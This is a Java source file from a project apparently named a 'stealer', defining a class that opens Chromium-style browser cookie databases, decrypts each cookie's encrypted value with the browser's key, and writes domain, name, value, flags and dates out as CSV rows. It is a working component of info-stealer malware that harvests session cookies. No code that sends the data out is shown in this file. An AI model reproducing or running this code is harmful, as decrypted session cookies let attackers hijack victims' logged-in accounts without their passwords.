package com.github.shurpe.stealer.utils.browser.data;

import com.github.shurpe.stealer.utils.browser.BrowserProfile;
import com.github.shurpe.stealer.utils.Utils;

import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

public final class BrowserDataCookies extends BrowserData {

	public final static String CSV_HEADER = "Browser,Domain,Path,Name,Value,Secured,Http Only,Session,Creation Date,Expiry Date\n";

	private final List<Cookie> cookies;

	public BrowserDataCookies(final BrowserProfile profile) {
		super(profile, "Network\\Cookies", "cookies");

		this.cookies = new ArrayList<>();
		this.findResultSets();
	}

	@Override
	public String toCsvColumn() {
		return super.toCsvColumn(cookies);
	}

	@Override
	public void onResultSetFound(final ResultSet rs) {
		try {
			cookies.add(new Cookie(rs, this.getProfile().getBrowser().getDecryptionKey()));
		} catch (SQLException ignored) {
		}
	}

	public static final class Cookie extends Data {

		private final String domain, path, name, value;
		private final boolean isSecured, isHttpOnly, isSession;
		private final String creationDate, expiryDate;

		public Cookie(ResultSet rs, byte[] key) throws SQLException {
			domain = rs.getString("host_key");
			path = rs.getString("path");
			name = rs.getString("name");
			value = Utils.getEncrypted(rs, "encrypted_value", key);
			isSecured = rs.getBoolean("is_secure");
			isHttpOnly = rs.getBoolean("is_httponly");
			isSession = !rs.getBoolean("is_persistent");
			creationDate = Utils.getDate(rs, "creation_utc");
			expiryDate = Utils.getDate(rs, "expires_utc");
		}

		@Override
		public String toCsvColumn() {
			return '\"' + domain + "\",\"" + path + "\",\"" + name + "\",\"" + value + "\",\"" +
							isSecured + "\",\"" + isHttpOnly + "\",\"" + isSession + "\",\"" +
							creationDate + "\",\"" + expiryDate + "\"\n";
		}
	}
}